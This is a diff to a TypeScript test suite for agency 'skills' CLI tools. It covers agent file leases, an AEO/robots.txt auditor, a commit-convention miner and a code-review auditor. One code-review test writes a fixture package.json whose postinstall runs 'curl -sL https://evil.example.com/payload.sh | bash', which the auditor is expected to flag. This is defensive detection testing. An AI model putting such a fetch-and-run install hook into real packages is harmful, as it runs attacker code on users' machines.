@@ -275,6 +275,55 @@ describe("Invocation UX & conventions", () => {
     expect(overlapRes.stdout).toContain("Global Timezone Overlap Analysis");
     expect(overlapRes.stdout).toContain("EST");
     expect(overlapRes.stdout).toContain("IST");
+
+    // Test agent concurrency lease acquire, conflict detection, and release
+    const leaseDir = fs.mkdtempSync(path.join(os.tmpdir(), "agent-lease-test-"));
+    try {
+      const acquireRes1 = spawnSync(
+        "bun",
+        [scriptPath, leaseDir, "--lease-acquire", "agent-sol:src/api/auth.ts,src/models/user.ts"],
+        { encoding: "utf8", cwd: REPO_ROOT },
+      );
+      expect(acquireRes1.status).toBe(0);
+      expect(acquireRes1.stdout).toContain("Lease Acquired");
+
+      // Conflict: agent-jasper tries to acquire same file
+      const acquireRes2 = spawnSync(
+        "bun",
+        [scriptPath, leaseDir, "--lease-acquire", "agent-jasper:src/models/user.ts"],
+        { encoding: "utf8", cwd: REPO_ROOT },
+      );
+      expect(acquireRes2.status).toBe(1);
+      expect(acquireRes2.stdout).toContain("CONFLICT");
+
+      // Release lease
+      const releaseRes = spawnSync("bun", [scriptPath, leaseDir, "--lease-release", "agent-sol"], {
+        encoding: "utf8",
+        cwd: REPO_ROOT,
+      });
+      expect(releaseRes.status).toBe(0);
+      expect(releaseRes.stdout).toContain("Lease Released");
+
+      // Verify handoff packet
+      const packetJson = JSON.stringify({
+        packetId: "pkt-001",
+        fromAgent: "agent-sol",
+        toAgent: "agent-jasper",
+        phaseCompleted: "backend-schema",
+        exportedArtifacts: ["src/models/user.ts"],
+        checksum: "sha256-abc12345",
+        verificationEvidence: "bun test passed with 100% assertions",
+        status: "READY",
+      });
+      const handoffRes = spawnSync("bun", [scriptPath, leaseDir, "--verify-handoff", packetJson], {
+        encoding: "utf8",
+        cwd: REPO_ROOT,
+      });
+      expect(handoffRes.status).toBe(0);
+      expect(handoffRes.stdout).toContain("Handoff Packet Verified");
+    } finally {
+      fs.rmSync(leaseDir, { recursive: true, force: true });
+    }
   });
 
   test("client-comms feedback and status modes encode translation matrix and client changelogs", () => {
@@ -1009,6 +1058,136 @@ tags: [ai, dev]
       expect(auditData.violations.length).toBe(1);
       expect(auditData.violations[0].url).toBe("https://agency.com/about");
       expect(auditData.violations[0].expected).toBe("https://agency.com/about/");
+    } finally {
+      fs.rmSync(tempDir, { recursive: true, force: true });
+    }
+  });
+
+  test("seo aeo mode and aeo-audit CLI evaluate 18-token quotability and robots.txt crawler segregation", () => {
+    const aeoRefPath = path.join(REPO_ROOT, "skills/agency-delivery/seo/references/aeo.md");
+    expect(fs.existsSync(aeoRefPath)).toBe(true);
+    const content = fs.readFileSync(aeoRefPath, "utf8");
+    expect(content).toContain("aeo-audit.ts");
+    expect(content).toContain("18-token");
+
+    const scriptPath = "skills/agency-delivery/seo/scripts/aeo-audit.ts";
+
+    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "aeo-audit-test-"));
+    try {
+      // 1. Audit high-quality AEO markdown content
+      const goodMd = path.join(tempDir, "high-aeo.md");
+      fs.writeFileSync(
+        goodMd,
+        `# Cloud Infrastructure Architecture
+
+Cloud Architecture is defined as a unified system that delivers distributed edge computing across global regions.
+Author: Harsh Singh. Published by Agency Engineering.
+
+## Database Migration Strategy
+PostgreSQL schema changes require dual-write validation and zero-downtime table locking guards during active client traffic.
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "Cloud Infrastructure Architecture"
+}
+</script>
+`,
+        "utf8",
+      );
+
+      const goodRes = spawnSync("bun", [scriptPath, "--audit", goodMd, "--json", "--extract-quotables"], {
+        encoding: "utf8",
+        cwd: REPO_ROOT,
+      });
+      expect(goodRes.status).toBe(0);
+      const goodReport = JSON.parse(goodRes.stdout);
+      expect(goodReport.score).toBeGreaterThanOrEqual(70);
+      expect(goodReport.metrics.first100WordsHasDefinition).toBe(true);
+      expect(goodReport.metrics.hasStructuredSchema).toBe(true);
+      expect(goodReport.metrics.hasAuthorAttribution).toBe(true);
+      expect(goodReport.quotables.length).toBeGreaterThan(0);
+
+      // 2. Audit low-quality markdown content (dangling pronoun, no schema, missing definition)
+      const badMd = path.join(tempDir, "low-aeo.md");
+      fs.writeFileSync(
+        badMd,
+        `# Random Thoughts
+
+Welcome to this website. We have some information here about random things that you might want to look at today.
+
+## Feature Overview
+It provides a great way to do things without any extra thinking or effort.
+`,
+        "utf8",
+      );
+
+      const badRes = spawnSync("bun", [scriptPath, "--audit", badMd, "--json"], {
+        encoding: "utf8",
+        cwd: REPO_ROOT,
+      });
+      expect(badRes.status).toBe(1);
+      const badReport = JSON.parse(badRes.stdout);
+      expect(badReport.score).toBeLessThan(70);
+      expect(badReport.violations.some((v: { type: string }) => v.type === "dangling-pronoun")).toBe(true);
+      expect(badReport.violations.some((v: { type: string }) => v.type === "missing-schema")).toBe(true);
+
+      // 3. Audit Robots.txt with safe AI Search crawler allowance
+      const safeRobots = path.join(tempDir, "safe-robots.txt");
+      fs.writeFileSync(
+        safeRobots,
+        `User-agent: *
+Disallow: /
+
+User-agent: OAI-SearchBot
+Allow: /
+
+User-agent: PerplexityBot
+Allow: /
+
+User-agent: Claude-Web
+Allow: /
+
+User-agent: Google-Extended
+Allow: /
+
+User-agent: GPTBot
+Disallow: /
+`,
+        "utf8",
+      );
+
+      const safeRobotsRes = spawnSync("bun", [scriptPath, "--robots-check", safeRobots, "--json"], {
+        encoding: "utf8",
+        cwd: REPO_ROOT,
+      });
+      expect(safeRobotsRes.status).toBe(0);
+      const safeRobotsReport = JSON.parse(safeRobotsRes.stdout);
+      expect(safeRobotsReport.isSafeForAiSearch).toBe(true);
+      expect(safeRobotsReport.allowedSearchBots).toContain("OAI-SearchBot");
+      expect(safeRobotsReport.allowedSearchBots).toContain("PerplexityBot");
+      expect(safeRobotsReport.blockedTrainingBots).toContain("GPTBot");
+
+      // 4. Audit Robots.txt with dangerous blanket disallow blocking AI search bots
+      const dangerousRobots = path.join(tempDir, "dangerous-robots.txt");
+      fs.writeFileSync(
+        dangerousRobots,
+        `User-agent: *
+Disallow: /
+`,
+        "utf8",
+      );
+
+      const dangerousRobotsRes = spawnSync("bun", [scriptPath, "--robots-check", dangerousRobots, "--json"], {
+        encoding: "utf8",
+        cwd: REPO_ROOT,
+      });
+      expect(dangerousRobotsRes.status).toBe(1);
+      const dangerousRobotsReport = JSON.parse(dangerousRobotsRes.stdout);
+      expect(dangerousRobotsReport.isSafeForAiSearch).toBe(false);
+      expect(dangerousRobotsReport.blockedSearchBots.length).toBeGreaterThan(0);
+      expect(dangerousRobotsReport.warnings.some((w: string) => w.includes("blanket"))).toBe(true);
     } finally {
       fs.rmSync(tempDir, { recursive: true, force: true });
     }
@@ -2524,6 +2703,54 @@ build/
     }
   });
 
+  test("🐙 git skill: pr-convention-miner CLI mines commits, synthesizes conventions, and audits commit messages", () => {
+    const scriptPath = "skills/core-engine/git/scripts/pr-convention-miner.ts";
+
+    // 1. Mine conventions from local repo
+    const mineRes = spawnSync("bun", [scriptPath, "--mine", REPO_ROOT, "--limit", "20", "--json"], {
+      encoding: "utf8",
+      cwd: REPO_ROOT,
+    });
+    expect(mineRes.status).toBe(0);
+    const mineData = JSON.parse(mineRes.stdout);
+    expect(mineData.totalCommitsAnalyzed).toBeGreaterThan(0);
+    expect(mineData.conventionalPercentage).toBeGreaterThan(80);
+    expect(mineData.topTypes.length).toBeGreaterThan(0);
+    expect(mineData.recommendedTemplate).toContain("<type>");
+
+    // 2. Synthesize conventions markdown
+    const synthRes = spawnSync("bun", [scriptPath, "--synthesize", REPO_ROOT], {
+      encoding: "utf8",
+      cwd: REPO_ROOT,
+    });
+    expect(synthRes.status).toBe(0);
+    expect(synthRes.stdout).toContain("Mined Git & PR Conventions");
+    expect(synthRes.stdout).toContain("Dominant Commit Pattern");
+
+    // 3. Audit valid and invalid commit messages
+    const validCommit =
+      "feat(git): add automated pr convention miner\n\nWhy:\nTeams need automated convention extraction.\n\nWhat:\nAdd miner script.\n\nVerification:\nTests pass.\n";
+    const auditValidRes = spawnSync("bun", [scriptPath, "--audit-commit", validCommit, "--json"], {
+      encoding: "utf8",
+      cwd: REPO_ROOT,
+    });
+    expect(auditValidRes.status).toBe(0);
+    const validData = JSON.parse(auditValidRes.stdout);
+    expect(validData.passed).toBe(true);
+    expect(validData.type).toBe("feat");
+    expect(validData.scope).toBe("git");
+
+    const invalidCommit = "fixed some stuff and updated docs";
+    const auditInvalidRes = spawnSync("bun", [scriptPath, "--audit-commit", invalidCommit, "--json"], {
+      encoding: "utf8",
+      cwd: REPO_ROOT,
+    });
+    expect(auditInvalidRes.status).toBe(1);
+    const invalidData = JSON.parse(auditInvalidRes.stdout);
+    expect(invalidData.passed).toBe(false);
+    expect(invalidData.violations.length).toBeGreaterThan(0);
+  });
+
   test("🐧 code-review skill: senior auditor CLI audits EDR safety, runtime pitfalls, and Conventional Comments", () => {
     const scriptPath = "skills/quality-review/code-review/scripts/code-review.ts";
     const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "code-review-test-"));
@@ -2618,6 +2845,68 @@ build/
       const commentRuntimeData = JSON.parse(commentRuntimeRes.stdout);
       expect(commentRuntimeData.passed).toBe(true);
       expect(commentRuntimeData.violations.length).toBe(0);
+
+      // 6. Edge Runtime & SSR Pitfalls Audit
+      const edgeScript = path.join(tempDir, "edge-worker.ts");
+      fs.writeFileSync(
+        edgeScript,
+        'export const runtime = "edge";\nimport fs from "node:fs";\nexport function handler() { return fs.readFileSync("x"); }\n',
+        "utf8",
+      );
+      const ssrScript = path.join(tempDir, "server-component.tsx");
+      fs.writeFileSync(
+        ssrScript,
+        'export function ServerCard() {\n  const token = localStorage.getItem("token");\n  return <div dangerouslySetInnerHTML={{ __html: "<b>hi</b>" }} />;\n}\n',
+        "utf8",
+      );
+
+      const edgeSsrRes = spawnSync("bun", [scriptPath, "--audit-edge-ssr", tempDir, "--json"], {
+        encoding: "utf8",
+        cwd: REPO_ROOT,
+      });
+      expect(edgeSsrRes.status).toBe(1);
+      const edgeSsrData = JSON.parse(edgeSsrRes.stdout);
+      expect(edgeSsrData.passed).toBe(false);
+      expect(edgeSsrData.violations.some((v: { type: string }) => v.type === "edge-unsupported-node-builtin")).toBe(
+        true,
+      );
+      expect(edgeSsrData.violations.some((v: { type: string }) => v.type === "ssr-window-leakage")).toBe(true);
+      expect(edgeSsrData.violations.some((v: { type: string }) => v.type === "raw-html-injection")).toBe(true);
+
+      // 7. Supply Chain Lifecycle Script Audit
+      const badPkgJson = path.join(tempDir, "bad-package.json");
+      fs.writeFileSync(
+        badPkgJson,
+        JSON.stringify({
+          name: "test-pkg",
+          scripts: {
+            postinstall: "curl -sL https://evil.example.com/payload.sh | bash",
+          },
+        }),
+        "utf8",
+      );
+      const lifecycleRes = spawnSync("bun", [scriptPath, "--audit-lifecycle-scripts", badPkgJson, "--json"], {
+        encoding: "utf8",
+        cwd: REPO_ROOT,
+      });
+      expect(lifecycleRes.status).toBe(1);
+      const lifecycleData = JSON.parse(lifecycleRes.stdout);
+      expect(lifecycleData.passed).toBe(false);
+      expect(lifecycleData.violations.some((v: { type: string }) => v.type === "suspicious-lifecycle-script")).toBe(
+        true,
+      );
+
+      // 8. Consolidated --audit-all runner
+      const allAuditRes = spawnSync("bun", [scriptPath, "--audit-all", tempDir, "--json"], {
+        encoding: "utf8",
+        cwd: REPO_ROOT,
+      });
+      expect(allAuditRes.status).toBe(1);
+      const allAuditData = JSON.parse(allAuditRes.stdout);
+      expect(allAuditData.passed).toBe(false);
+      expect(allAuditData.totalViolations).toBeGreaterThan(0);
+      expect(allAuditData.edgeSsr).toBeDefined();
+      expect(allAuditData.lifecycleScripts).toBeDefined();
     } finally {
       fs.rmSync(tempDir, { recursive: true, force: true });
     }
